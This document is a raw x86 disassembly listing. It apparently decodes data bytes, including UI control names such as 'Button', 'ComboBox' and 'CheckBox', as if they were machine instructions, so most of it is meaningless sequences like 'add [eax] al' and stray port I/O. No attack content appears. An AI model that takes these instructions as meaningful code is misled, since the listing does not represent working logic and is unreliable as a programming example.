add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xdaac0042 0x45
sub_45610e
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x240048ca ] al
fiadd [ ebp ]
pop eax
adc al 0x45
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_456144
adc [ eax * 2 + 0x48cb5400 ] 0x0
or bl bl
inc ebp
add [ eax - 0x35 ] bh
dec eax
add [ eax + 0x18004514 ] dl
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x240048ca ] al
fiadd [ ebp ]
pop eax
adc al 0x45
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_456186
dec eax
add [ ebx + ecx * 8 - 0x3327ffb8 ] bl
dec eax
add [ 0x73755054 ] dl
push 0x74747542
add [ esi - 0x43ffba9d ] ah
add al [ eax ]
add [ ebp + ebx * 2 - 0x7d93ffbb ] bl
inc esp
outsd
insd
inc edx
jne r-xdata
add [ edx + eax * 4 + 0x44 ] dh
mov esp 0x9c000002
je r-xdata
arpl [ ebp ] ax
outsb
push esp
inc edx
jne r-xdata
add [ esp + eax * 4 + 0x44 ] cl
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
je r-xdata
pop ebp
inc ebp
add [ edx + eax * 4 + 0x44 ] ch
outsb
push ebx
je r-xdata
add ah bh
jmp 0xffffffff84a96288
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0xc004561 ] ch
bound esi [ ebx + 0x50 ]
jne r-xdata
inc esp
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xa4004481
call 0x75a162a7
push 0x74747542
outsd
outsb
or eax 0x6f437362
insd
insd
popad
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5373620d
jo r-xdata
dec ecx
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ ecx + ebp * 8 - 0x1613ffbb ] bh
inc ebp
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + ebp * 8 + 0x755c0045 ] ah
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esi + ebx * 8 + 0x45 ] bh
add [ eax - 0x73ffb691 ] al
jne r-xdata
imul esi [ edx + eax * 2 + 0x75 ] 0x6e6f7474
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
add [ eax - 0x23 ] bh
insb
jae r-xdata
adc [ ebp - 0x43b142cb ] edi
add [ eax + ebp * 2 + 0x49 ] bh
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah cl
out 0x45 eax
add al al
sub [ ecx ] ecx
call 0x2ddd634f
dec ecx
add [ ebp + ebp + 0x2e500049 ] bh
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445aba7
jle r-xdata
je r-xdata
pushad
bound eax [ ebp ]
add [ eax ] al
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ esp + ebx * 8 ] dl
inc ebp
add [ eax ] bh
fadd [ ebp ]
jl r-xdata
or [ ebp + 0x49 ] bh
adc al 0x0
pop es
mov al 0xef
inc ebp
add [ eax ] cl
inc ebp
add [ eax - 0x1f ] dl
inc ebp
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah al
push esi
inc esp
add [ edx + eax ] ch
add [ ebx ] cl
add [ 0x11b006b0 ] al
mov ebp 0xbc4ebd35
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
arpl [ ebp ] ax
mov eax 0x4563
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x63 ] ah
inc ebp
outsd
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x61ac9090
inc ebp
add [ ebx ] al
sbb dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esp + ebx * 8 ] bh
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
sub_4563ce
add [ edi ] cl
add [ eax ] cl
push ebx
je r-xdata
sub ecx [ ecx ]
ror [ ebp + 0x42 ] 0x0
mov esp 0xec0045e9
jmp 0x1275648f
inc ebx
je r-xdata
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ esi + ebx * 8 + 0x45 ] bh
add [ eax - 0x73ffb691 ] al
jne r-xdata
insb
jae r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
add [ esp ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x2bc0045 ] ah
add [ eax ] al
or [ edx + 0x45 ] ah
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84a9645c
add [ ebx + r-xdata ] dh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add ah cl
out 0x45 eax
add al al
sub [ ecx ] ecx
call 0x2ddd6523
dec ecx
add [ ebp + ebp + 0x2e500049 ] bh
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445ad7b
jle r-xdata
insb
jae r-xdata
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ esp + ebx * 8 ] dl
inc ebp
add [ eax ] bh
fadd [ ebp ]
jl r-xdata
or [ ebp + 0x49 ] bh
inc ebp
add [ eax ] cl
inc ebp
add [ eax - 0x1f ] dl
inc ebp
add [ edi ] al
push esp
inc edx
jne r-xdata
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ eax ] dl
add [ 0x67696c41 ] al
outsb
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
add [ eax + 0x2f ] dh
inc edx
add [ eax + eax ] bh
add dh bh
dec esp
ror [ eax ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sldt [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
shl [ ecx + 0x48 ] 0x1
add [ ebx ] bl
add bh bh
pushad
ror [ eax ] cl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
add eax 0x67696c41
dec eax
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
je r-xdata
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esp + ebx * 8 ] bh
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430f0015 ] al
outsd
insd
insd
popad
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x746e6948
sbb al 0x7c
dec eax
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0016 ] al
outsd
outsb
jae r-xdata
push eax
adc eax [ edx ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
adc [ eax ] eax
pop es
add al cl
ror [ eax ] 0x1
add [ eax ] al
add [ eax + 0x3 ] al
outsb
xor [ ebp + 0x45 ] ah
add [ edi ] al
pop es
push esp
inc edx
jne r-xdata
insb
inc edx
jne r-xdata
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x43070014 ] al
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080012 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ ecx + 0x2 ] ch
add bh bh
imul eax [ edx ] 0x1ff00
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax [ eax ]
push es
inc ebx
popad
outsb
arpl [ ebp + 0x6c ] sp
adc [ ebx + 0x48 ] bh
add [ eax - 0x21 ] ch
dec eax
add [ eax - 0x67ffb721 ] ah
pop es
dec ecx
add [ eax ] al
add [ eax ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
je r-xdata
add [ eax ] cl
inc esp
jb r-xdata
dec ecx
imul ebp [ esi + 0x74 ] 0x44561873
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
insb
add al [ eax ]
dec [ eax ]
jecxz r-xdata
outsb
xor al 0x64
inc ebp
add [ eax ] al
dec ebp
outsd
inc esp
pop ds
inc esi
add [ eax + 0x2 ] bh
add bh bh
mov al 0xe3
inc ebp
add [ ecx ] al
jb r-xdata
cwde
jno r-xdata
add [ eax ] al
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
add [ eax ] al
add [ eax ] al
push esi
inc esp
add [ edx + eax ] dl
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc esp
popa
jne r-xdata
xor ah 0xff
out dx eax
inc esp
add [ edx + eax ] dh
inc [ eax + 0x10045e3 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax + 0x2 ] dh
add bh bh
dec eax
jecxz r-xdata
sbb [ esi + 0x44 ] dl
add [ ecx ] al
and [ eax ] al
add al 0x46
jo r-xdata
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
and eax [ eax ]
or cl [ ecx + 0x6d ]
popad
dec ecx
outsb
out dx eax
inc esp
add [ eax + 0x44ff0002 ] al
in al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ds
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
les edi [ ecx + 0x640046 ]
add bh bh
loopne r-xdata
outsd
ja r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
js r-xdata
pop edi
inc ebp
add [ eax - 0x5700fffe ] dl
in eax 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x490c0024 ] al
insd
popad
dec ebp
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
outsb
je r-xdata
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
dec ebp
outsb
jne r-xdata
inc esp
add [ edx + eax ] bh
dec esp
jecxz r-xdata
jae r-xdata
jb r-xdata
imul ebp [ esi + 0x73 ] r-xdata
xchg esp eax
add al [ eax ]
push [ ebp + 0x10045 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6d490600
popad
jae r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060025 ] al
insd
add [ ecx ] dl
inc ebp
insb
jbe r-xdata
push esi
inc esi
add [ eax + eax ] ah
jmp [ eax + 0x48 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
jb r-xdata
jmp esp
outsb
je r-xdata
sbb [ fs : esi + 0x44 ] dl
add [ ecx ] bl
add bh bh
pushfd
loopne r-xdata
jno r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x440e0019 ] al
outsd
jne r-xdata
jpe r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x1865646f
push esi
inc esp
add [ eax ] al
sub [ eax ] eax
or dl [ eax + 0x61 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add dh ah
add [ eax ] eax
dec esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
adc al 0x50
popad
jb r-xdata
dec ebp
outsd
sbb [ gs : esi + 0x44 ] dl
add [ edx + eax + 0x29cff00 ] bl
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ es : ebx ] cl
dec ebp
outsd
popad
insb
push edx
jae r-xdata
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
outsd
outsb
push edx
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x440c001d ] al
jb r-xdata
add al [ eax ]
push [ eax + 0x10045e3 ]
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add [ eax - 0x1 ] al
sub al 0x0
adc [ eax + 0x72 ] edx
jae r-xdata
outsb
je r-xdata
inc [ edi + ebx * 8 + 0x48 ]
outsb
je r-xdata
sub [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
jo r-xdata
jb r-xdata
push eax
popad
insb
je r-xdata
mov al 0xe4
inc ebp
add [ ecx + ebp * 8 + 0x45 ] bl
add [ eax - 0x1 ] al
and al [ eax ]
push cs
dec ecx
insd
popad
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e656d
push 0x8c0044ef
add al [ eax ]
push [ eax - 0x63ffba1c ]
jmp r-xdata
pop edi
inc ebp
add [ edx + eax - 0x1b8b0100 ] al
je r-xdata
imul esi [ edx + 0x65 ] 0x44561864
add [ eax + eax ] cl
add [ edi ] ch
dec ecx
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax + 0x1 ] al
outsd
jne r-xdata
inc esp
add al ah
add [ eax ] eax
inc [ ebx + ebp * 2 + 0x49 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] eax
pop es
add [ 0x6c797453 ] al
clc
jpe r-xdata
imul ebp [ esi + 0x74 ] r-xdata
test al 0x2
add bh bh
out 0x45 al
arpl [ gs : ebp + 0x64 ] si
dec ecx
insd
popad
dec ecx
outsb
js r-xdata
outsb
jne r-xdata
add [ esi ] cl
push eax
popad
push esi
inc esp
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
daa
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add bh bh
mov al 0xde
dec eax
add [ eax ] bl
or [ ecx ] cl
add [ eax ] al
add [ eax + 0x1 ] al
xor al [ eax ]
pop es
add [ edx + ebp * 2 + 0x6b2c0049 ] ch
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
out dx eax
inc esp
add [ edx + eax - 0x19cb0100 ] ah
inc ebp
push eax
popad
jb r-xdata
add [ esi ] cl
push esi
inc esp
add [ edx - 0x1b010000 ] cl
loopne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
je r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec eax
insb
inc edx
jne r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x18656c62
push esi
inc esp
add [ ecx + 0x2 ] ah
add bh bh
insb
fld [ ebp ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
push esi
inc esp
add [ edi ] dl
add [ eax ] cl
push esi
inc esp
add [ ecx - 0x3f010000 ] cl
loopne r-xdata
push ebx
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : eax ] cl
out dx eax
inc esp
add [ eax + 0x4ff0002 ] ah
out 0x45 al
add [ eax ] al
xor [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
push edi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
add bh bh
add al 0xe6
inc ebp
sub al [ eax ]
push cs
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
outsb
js r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
jb r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
das
popad
inc ebp
add [ eax + 0x64ff0002 ] ch
out 0x45 al
add [ eax ] al
add [ eax - 0x1 ] al
xor [ eax ] al
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax + 0x48e0 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002e ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
insd
popad
dec ecx
pop ds
inc esi
add [ eax + eax ] bh
add [ eax + 0x5009002b ] al
outsd
jb r-xdata
push edi
jb r-xdata
dec ebx
jns r-xdata
inc esp
outsd
arpl [ ebx - 0x78 ] bp
or [ eax ] 0x8
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
xor eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
adc al 0x42
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ edi ] al
push esi
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
inc ebp
outsb
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or [ edi + 0x6e ] ecx
or [ eax ] 0xff0000e0
loopne r-xdata
cmp [ ecx ] al
add bh bh
cmp [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
jo r-xdata
popad
je r-xdata
sbb al 0x81
dec eax
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a003e ] al
outsb
dec ebx
jns r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ edx ] cl
dec edi
jae r-xdata
inc ebp
outsb
je r-xdata
add [ edi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
or [ eax ] 0x28
add [ eax ] eax
[ eax ]
inc ebx
add [ edi + ecx * 2 ] cl
cmp al 0x7f
dec eax
add al al
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
jb r-xdata
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebp + ebp * 2 + 0x630b0045 ] bl
push ebp
add [ ebp ] 0x9
dec edi
jb r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
outsd
arpl [ ebx + 0x40 ] bp
dec esp
popad
jbe r-xdata
jae r-xdata
inc esp
outsd
ja r-xdata
outsb
dec ebp
outsd
jne r-xdata
add [ ecx ] 0xb
dec edi
jae r-xdata
add [ eax + 0x4f09003a ] al
outsb
jb r-xdata
inc esp
jns r-xdata
jb r-xdata
test [ eax ] cl
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0046 ] al
bound edx [ ebp + 0x6e ]
arpl [ eax + 0x65 ] bp
arpl [ ebx + 0x65 ] bp
or [ fs : ebx + 0x62 ] esp
inc ebx
push 0x656b6365
or [ fs : ebx + 0x62 ] ah
inc edi
jo r-xdata
push ebp
inc edx
add [ edi + ecx * 2 ] cl
outsb
dec ebp
outsd
jne r-xdata
outsb
adc al 0x42
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0043 ] al
add [ eax ] al
outsd
inc ebp
jb r-xdata
outsb
push ebx
je r-xdata
dec edi
mov ah 0x7f
dec eax
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0044 ] al
outsb
dec ebp
outsd
jne r-xdata
outsb
push ebx
je r-xdata
add [ edi ] 0xb
dec ebp
adc al 0x42
add [ eax ] bh
add [ eax ] eax
rol [ eax + 0x2200048 ] 0x1
add bh bh
and [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ edi ] al
dec edi
outsb
inc esp
jb r-xdata
add [ eax + 0x4f0a0037 ] al
adc al 0x42
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0f0038 ] al
outsb
inc esp
jb r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
pop esp
jne r-xdata
or [ fs : ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
nop
mov al [ 0x300456d ]
push cs
push esp
inc ebx
push 0x426b6365
outsd
js r-xdata
jb r-xdata
imul esp [ ebp + 0x64 ] 0x8
arpl [ edx + 0x47 ] sp
jb r-xdata
add [ edx + eax ] dh
inc esp
popad
outsd
jbe r-xdata
dec ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
cmp al 0x7f
dec eax
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090045 ] al
inc ebp
outsb
je r-xdata
jo r-xdata
inc ebp
add [ ebp * 8 + 0x540f0045 ] bl
inc ebx
jne r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ ebp + ebp * 8 - 0x1243ffbb ] bl
inc ebp
add [ eax - 0x13 ] cl
inc ebp
add [ esi ] al
add [ 0x6b01000 ] al
mov al 0x11
mov ebp 0xffcaffeb
test al 0xee
inc ebp
add al al
out dx al
inc ebp
add al cl
out dx al
inc ebp
add [ edi + ebp * 8 + 0x45 ] ah
add [ eax + 0x1c0045ed ] cl
in eax dx
inc ebp
add [ edi ] cl
push esp
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
add [ esp + ebx * 8 ] bh
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ eax ] ah
out dx al
inc ebp
add al al
sub [ ecx ] ecx
sub dh 0x45
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445b787
jle r-xdata
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
adc cl [ ecx ]
js r-xdata
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] ch
outsd
inc ebp
add [ esi + 0x6f ] cl
inc ebp
je r-xdata
nop
inc esp
jns r-xdata
jb r-xdata
cmp al [ eax ]
or [ edi + 0x6e ] ecx
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
je r-xdata
add [ eax + edx + 0x49 ] bh
add [ ebp + esi * 2 + 0x49 ] bl
add [ ecx + eax * 4 + 0x44 ] ah
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax - 0x7fffba14 ] dh
outsd
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
or [ eax ] 0x0
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0047 ] al
nop
nop
inc eax
outsb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 2 + 0x45 ] ah
add [ ebp + ebx * 2 - 0x7d93ffbb ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] dh
je r-xdata
add [ eax ] 0x0
adc al 0x42
add [ eax ] al
add al [ eax ]
inc [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
outsb
inc ebp
js r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
clc
add [ eax ] al
xchg esp eax
and eax 0x12300049
add [ edx + eax ] dh
add al ch
insd
inc ebp
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ eax ] al
insd
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84a96e68
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ eax ] eax
jns r-xdata
je r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
dec ecx
add [ esp + ebp + 0x49 ] dl
add [ eax + 0x2e ] dl
nop
outsd
inc ebp
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax + 0x4f07003b ] al
outsb
add [ eax ] al
or [ eax ] 0x10
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
